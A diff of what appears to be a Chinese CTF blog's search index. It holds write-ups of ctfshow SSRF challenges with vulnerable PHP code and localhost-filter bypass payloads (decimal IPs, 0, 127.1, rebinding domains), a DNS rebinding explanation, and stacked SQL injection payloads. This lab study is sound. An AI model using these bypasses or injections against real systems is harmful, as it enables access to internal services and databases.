-<h2 id="Web352"><a href="#Web352" class="headerlink" title="Web352"></a>Web352</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
-
-<h4 id="前置基础知识"><a href="#前置基础知识" class="headerlink" title="前置基础知识"></a>前置基础知识</h4><h5 id="parse-url函数"><a href="#parse-url函数" class="headerlink" title="parse_url函数"></a>parse_url函数</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_url</span>(参数<span class="number">1</span>，参数<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-
-<p>参数1：必填，是一个完整的url</p>
-<p>参数2：非必填，是一个大写参数变量，直接获取结果集的一部分</p>
-<p>参数2如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、 PHP_URL_QUERY 、 PHP_URL_FRAGMENT</span><br></pre></td></tr></table></figure>
-
-<p>函数解析一个URL并返回一个关联数组，包含在URL中出现的各种组成部分</p>
-<p>关联数组：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br></pre></td></tr></table></figure>
-
-<h5 id="die函数"><a href="#die函数" class="headerlink" title="die函数"></a>die函数</h5><p>die()函数输出一条消息，并退出当前脚本。是exit()函数的别名</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">die</span>(message) <span class="comment">#信息用&#x27;&#x27;括起来</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="preg-match函数"><a href="#preg-match函数" class="headerlink" title="preg_match函数"></a>preg_match函数</h5><p><a href="https://www.runoob.com/php/php-preg_match.html">https://www.runoob.com/php/php-preg_match.html</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>$pattern：要搜索的模式，字符串形式</li>
-<li>$subject：输入字符串</li>
-</ul>
-<p>中括号表示可选参数，括号的嵌套表现了其嵌套关系</p>
-<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里要求url必须是http(s)协议，并且不能包含127.0.0.1和localhost。这里可以将IP转化为长整型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0111 1111 0000 0000 0000 0000 0000 0001</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2130706433</span><br></pre></td></tr></table></figure>
-
-<h3 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://2130706433/flag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这里真的有限制吗？实则不然</p>
-<p>preg_match参数没有给全 :nerd_face:</p>
-<h2 id="Web353"><a href="#Web353" class="headerlink" title="Web353"></a>Web353</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
-
-<p>直接用上一道题的思路也可以做</p>
-<h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><ol>
-<li>127&#x2F;172开头就代表内网地址，不一定非得127.0.0.1</li>
-<li>Linux中0表示自身的地址，可以使用<a href="http://0.0.0.0/flag.php%E7%BB%95%E8%BF%87">http://0/flag.php绕过</a></li>
-<li>使用sudo.cc代替127.0.0.1</li>
-</ol>
-<h2 id="Web354"><a href="#Web354" class="headerlink" title="Web354"></a>Web354</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
-
-<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>url过滤包含1和0</p>
+<p>常规思路不太行，而且回文只有这几种。于是考虑堆叠注入。</p>
 <ol>
-<li>使用解析到127.0.0.1的url（302跳转）</li>
+<li>得到库名</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://safe.taobao.com/</span><br><span class="line"></span><br><span class="line">http://114.taobao.com/</span><br><span class="line"></span><br><span class="line">http://wifi.aliyun.com/</span><br><span class="line"></span><br><span class="line">http://imis.qq.com/</span><br><span class="line"></span><br><span class="line">http://localhost.sec.qq.com/</span><br><span class="line"></span><br><span class="line">http://ecd.tencent.com/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=0;show databases;</span><br></pre></td></tr></table></figure>
 
-<ol start="2">
-<li>使用sudo.cc</li>
-</ol>
-<h2 id="Web355"><a href="#Web355" class="headerlink" title="Web355"></a>Web355</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
+<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204503297.png" alt="image-20250312204503297" style="zoom: 80%;">
 
-<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>要求主机字符数不大于5</p>
-<p>那么直接使用0即可</p>
-<h3 id="其他思路-1"><a href="#其他思路-1" class="headerlink" title="其他思路"></a>其他思路</h3><ol>
-<li>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></li>
-</ol>
-<h2 id="Web356"><a href="#Web356" class="headerlink" title="Web356"></a>Web356</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
-
-<p>没得说</p>
-<h2 id="Web357"><a href="#Web357" class="headerlink" title="Web357"></a>Web357</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure>
-
-<h3 id="前置基础知识-1"><a href="#前置基础知识-1" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="filter-var函数"><a href="#filter-var函数" class="headerlink" title="filter_var函数"></a>filter_var函数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_var(variable,filter,options)</span><br></pre></td></tr></table></figure>
-
-<p>varieble：必须。规定要过滤的变量</p>
-<p>filter：可选。规定要使用的过滤器的ID。默认是FILTER_SANTIZE_STRING</p>
-<p>FILTER_VALIDATE_IP: 把值作为IP地址来验证，只限IPv4或IPv6或不是来自私有或者保留的范围</p>
-<p><a href="https://www.runoob.com/php/php-ref-filter.html">所有filter</a></p>
-<p>option：可选。规定一个包含标志&#x2F;选项的关联数组或者一个单一的标志&#x2F;选项。检查每个过滤器可能的标志和选项</p>
-<ul>
-<li>FILTER_FLAG_NO_PRIV_RANGE：排除IPv4私有地址段</li>
-</ul>
-<p>​	过滤范围： 192.168.0.0&#x2F;16192.168.0.0&#x2F;16（192.168.0.0 - 192.168.255.255） 10.0.0.0&#x2F;810.0.0.0&#x2F;8（10.0.0.0 - 10.255.255.255） 172.16.0.0&#x2F;12172.16.0.0&#x2F;12（172.16.0.0 - 172.31.255.255）</p>
-<ul>
-<li>FILTER_FLAG_NO_RES_RANGE：排除特殊用途 IP 段</li>
-</ul>
-<p>​	过滤范围： 0.0.0.0&#x2F;80.0.0.0&#x2F;8（保留地址） 127.0.0.0&#x2F;8127.0.0.0&#x2F;8（环回地址） 169.254.0.0&#x2F;16169.254.0.0&#x2F;16（链路本地地址） 224.0.0.0&#x2F;4224.0.0.0&#x2F;4（多播地址） 240.0.0.0&#x2F;4240.0.0.0&#x2F;4（未来保留）</p>
-<h3 id="DNS-rebinding（DNS重新绑定攻击）"><a href="#DNS-rebinding（DNS重新绑定攻击）" class="headerlink" title="DNS rebinding（DNS重新绑定攻击）"></a>DNS rebinding（DNS重新绑定攻击）</h3><h4 id="dwords（双字）编码"><a href="#dwords（双字）编码" class="headerlink" title="dwords（双字）编码"></a>dwords（双字）编码</h4><p>将IP地址转换为32位无符号整型数值，其变种可以转化成十六进制或八进制</p>
-<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>攻击者注册一个域名，设置很短的TTL，先指向一个合法的公网IP，然后再TTL过期后更新位内网IP。当客户端首次解析域名时得到合法IP，但在后续请求时由于DNS缓存过期，重新解析得到内网IP，从而绕过同源策略，访问本地服务。</p>
-<p>攻击终点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址。</p>
-<blockquote>
-<p>TTL是英语Time-To-Live的简称，意思为一条域名解析在DNS服务器中的存留时间。当各地的NS服务器接收到解析请求时，就会向域名指定的DNS服务器发出解析请求从而获得解析记录。在获得这个记录之后，记录会在DNS服务器中保存一段时间，这段时间如果再接到这个域名的解析请求，DNS服务器将不再向NS服务器发出请求，而是直接返回刚才获得的记录；而这个记录再DNS服务器上保留的时间，就是TTL值</p>
-</blockquote>
-<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>代码中一共对域名进行了两次请求，第一次是gethostbyname方法，第二次则是file_get_contets文件读取。</p>
-<h2 id="Web358"><a href="#Web358" class="headerlink" title="Web358"></a>Web358</h2><p>待开发</p>
-<h2 id="Web359"><a href="#Web359" class="headerlink" title="Web359"></a>Web359</h2><p>待开发</p>
-<h2 id="Web360"><a href="#Web360" class="headerlink" title="Web360"></a>Web360</h2><p>待开发</p>
-<p>flag not here, and flag in ffffllllaaaagggg</p>
+<p>发现过滤的东西太多了。这道题目前对我来说有点偏，只放个链接在这</p>
+<p><a href="https://blog.csdn.net/RABCDXB/article/details/111398725">https://blog.csdn.net/RABCDXB/article/details/111398725</a></p>
+<p>1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p>
 ]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/03/18/php%E7%89%B9%E6%80%A7/%E5%B8%B8%E7%94%A8php%E7%89%B9%E6%80%A7/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="CTF中常用PHP特性总结"><a href="#CTF中常用PHP特性总结" class="headerlink" title="CTF中常用PHP特性总结"></a>CTF中常用PHP特性总结</h2><blockquote>
+<p><a href="https://www.cnblogs.com/gxngxngxn/p/17410173.html">https://www.cnblogs.com/gxngxngxn/p/17410173.html</a></p>
+</blockquote>
+<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br><span class="line">    参数说明：</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span>: 要搜索的模式，字符串形式。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$subject</span>: 输入字符串。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$matches</span>: 如果提供了参数matches，它将被填充为搜索结果。 <span class="variable">$matches</span>[<span class="number">0</span>]将包含完整模式匹配到的文本， <span class="variable">$matches</span>[<span class="number">1</span>] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$flags</span>：flags 可以被设置为以下标记值：</span><br><span class="line"></span><br><span class="line">    <span class="comment">#PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2>]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1540,18 +1627,6 @@
 <h2 id="Web92"><a href="#Web92" class="headerlink" title="Web92"></a>Web92</h2><p>题重复了</p>
 <p>不是后面怎么这么多重复的是我的问题吗</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/03/18/php%E7%89%B9%E6%80%A7/%E5%B8%B8%E7%94%A8php%E7%89%B9%E6%80%A7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="CTF中常用PHP特性总结"><a href="#CTF中常用PHP特性总结" class="headerlink" title="CTF中常用PHP特性总结"></a>CTF中常用PHP特性总结</h2><blockquote>
-<p><a href="https://www.cnblogs.com/gxngxngxn/p/17410173.html">https://www.cnblogs.com/gxngxngxn/p/17410173.html</a></p>
-</blockquote>
-<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br><span class="line">    参数说明：</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span>: 要搜索的模式，字符串形式。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$subject</span>: 输入字符串。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$matches</span>: 如果提供了参数matches，它将被填充为搜索结果。 <span class="variable">$matches</span>[<span class="number">0</span>]将包含完整模式匹配到的文本， <span class="variable">$matches</span>[<span class="number">1</span>] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$flags</span>：flags 可以被设置为以下标记值：</span><br><span class="line"></span><br><span class="line">    <span class="comment">#PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2>]]></content>
   </entry>
   <entry>
     <title>信息收集</title>
@@ -1893,6 +1968,37 @@
       </tags>
   </entry>
   <entry>
+    <title>CTF-SHOW刷题总结Web3</title>
+    <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
